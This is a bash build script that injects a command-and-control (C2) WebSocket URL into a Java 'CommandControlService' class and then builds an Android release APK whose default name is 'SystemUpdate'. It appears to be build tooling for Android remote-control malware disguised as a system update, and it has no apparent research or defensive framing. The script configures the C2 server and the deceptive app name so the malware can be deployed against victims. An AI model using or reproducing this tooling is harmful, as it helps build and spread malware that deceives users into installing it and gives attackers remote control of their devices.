#!/usr/bin/env bash
# Local release build — mirrors the GitHub Actions workflow
# Usage: ./build_local.sh [c2_url] [apk_name]
#   c2_url   → WebSocket URL to bake into the APK (default: wss://localhost:3000)
#   apk_name → output APK name without extension (default: SystemUpdate)

set -euo pipefail

C2_URL="${1:-wss://localhost:3000}"
APK_NAME="${2:-SystemUpdate}"
CCS="app/src/main/java/com/seguranca/protecao/CommandControlService.java"

echo "=== Injecting C2 URL: $C2_URL ==="
sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${C2_URL}\";|g" "$CCS"
grep -q "SERVER_URL = \"${C2_URL}\"" "$CCS" || { echo "ERROR: C2 URL injection failed"; exit 1; }
echo "OK: $(grep 'SERVER_URL =' "$CCS" | head -1)"

echo "=== Cleaning old builds ==="
rm -rf app/build/outputs/apk/release/*.apk 2>/dev/null || true

echo "=== Building release APK ==="
chmod +x gradlew
./gradlew assembleRelease --no-daemon --stacktrace

echo "=== Locating APK ==="
APK=$(find app/build/outputs/apk -name "*.apk" -type f | head -1)
[ -n "$APK" ] || { echo "ERROR: No APK produced"; exit 1; }
echo "Found: $APK"

OUT="${APK_NAME}_local.apk"
cp "$APK" "$OUT"
echo "=== Done: $OUT ==="
ls -lh "$OUT"
